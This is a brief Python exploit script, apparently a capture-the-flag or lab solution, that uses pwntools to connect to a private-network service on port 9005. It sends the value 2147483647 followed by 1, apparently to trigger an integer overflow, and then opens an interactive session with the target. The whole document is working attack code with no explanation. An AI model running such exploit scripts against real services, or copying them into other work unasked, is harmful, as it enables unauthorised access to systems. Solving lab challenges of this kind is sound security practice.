from pwn import *

ip = '10.10.71.61'

p = remote(ip, 9005)

p.sendline(b'2147483647')
p.sendline(b'1')
p.interactive()